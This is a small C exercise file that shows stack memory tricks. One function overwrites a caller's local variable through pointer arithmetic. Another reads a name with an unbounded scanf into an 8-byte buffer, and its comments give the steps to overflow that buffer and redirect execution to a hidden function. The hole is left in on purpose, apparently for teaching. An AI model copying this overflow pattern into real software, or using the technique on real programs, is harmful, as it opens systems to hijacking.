// NB: compile with -fno-stack-protector

#include <stdio.h>
#include <stdint.h>

void abracadabra() {
  char *p = (char *)&p; // ? is it legal
  //  char c;
  //  char *p = &c;

  /* distance to stack_fun's "a"
     [high]
          - padding     - 4
          - (nil)       - 8 (?)
          - ret addr    - 8
          - ebp         - 8
          - p itself    - 8
     [low]
  */
  //printf("%p\n", (uint64_t *)*((uint64_t*)p + 4));
  *(int *)(p + sizeof(char*) * 4 + sizeof(char*) - sizeof(int)) = 0x29A;
}

void magic_conversion() {
  int a = 42;
  abracadabra();
  printf("%d\n", a);
}

//------------------------------------------------------------------------------
void tell_secret() {
  printf("My dls\n");
}

void name_request() {
  // Steps:
  // 0) gcc 2-extra_fckng_hckng.c -fno-stack-protector
  // 1) objdump -d ./a.out | grep tell_secret # e.g. 00...0042BBCC
  // 2) printf A..[16 chars total]..A"\xCC\xBB\x42" | ./a.out
  char buff[8];
  printf("Enter your name: ");
  scanf("%s", buff);
}

int main(int argc, char** argv) {
  //magic_conversion();
  name_request();
}
